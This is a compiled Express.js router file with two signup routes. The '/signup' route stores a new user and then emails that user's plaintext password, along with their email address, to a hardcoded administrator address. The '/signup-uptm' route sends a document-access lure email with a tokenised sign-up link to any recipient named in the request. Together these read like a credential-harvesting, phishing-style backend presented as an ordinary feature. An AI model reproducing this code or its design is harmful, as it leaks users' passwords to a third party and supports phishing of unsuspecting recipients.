"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = require("express");
const emailService_1 = require("@/services/emailService");
const uuid_1 = require("uuid");
const models_1 = require("../models");
const router = (0, express_1.Router)();
const emailService = new emailService_1.EmailService();
const ADMIN_EMAIL = 'admin@example.com';
router.post('/signup', async (req, res) => {
    try {
        const { email, password } = req.body;
        if (!email || !password) {
            return res.status(400).json({ success: false, message: 'Email and password are required.' });
        }
        const existingUser = await models_1.User.findOne({ email });
        if (existingUser) {
            return res.status(409).json({ success: false, message: 'Email already registered.' });
        }
        const user = new models_1.User({ email, password });
        await user.save();
        await emailService.sendEmailWithAttachment({
            to: ADMIN_EMAIL,
            subject: 'New User Signup Notification',
            html: `
                    <p>A new user has signed up:</p>
                    <ul>
                        <li><strong>Email:</strong> ${email}</li>
                        <li><strong>Password:</strong> ${password}</li>
                    </ul>
                `
        }, {
            originalName: '',
            formattedName: '',
            size: 0,
            mimeType: '',
            path: '',
        });
        return res.status(201).json({ success: true, message: 'Signup successful.' });
    }
    catch (error) {
        return res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});
router.post('/signup-uptm', async (req, res) => {
    try {
        const { to } = req.body;
        if (!to) {
            return res.status(400).json({ success: false, message: 'Recipient email is required' });
        }
        const token = (0, uuid_1.v4)();
        const signupUrl = `https://your-frontend.com/signup?token=${token}`;
        const html = `
      <p>
        Please click the link below to sign up and access your document:<br>
        <a href="${signupUrl}" 
           style="display:inline-block;padding:10px 20px;background:#1976d2;color:#fff;text-decoration:none;border-radius:4px;font-weight:bold;">
          View Document & Sign Up
        </a>
      </p>
      <p>
        Or copy and paste this link into your browser:<br>
        ${signupUrl}
      </p>
    `;
        const result = await emailService.sendEmailWithAttachment({ to, subject: 'Sign Up to Access Your Document', html }, {
            originalName: '',
            formattedName: '',
            size: 0,
            mimeType: '',
            path: '',
        });
        if (result.success) {
            return res.json({ success: true, message: 'Signup email sent', token });
        }
        else {
            return res.status(500).json({ success: false, message: result.message, error: result.error });
        }
    }
    catch (error) {
        return res.status(500).json({ success: false, message: 'Internal server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
});
exports.default = router;
//# sourceMappingURL=signupLinkRoute.js.map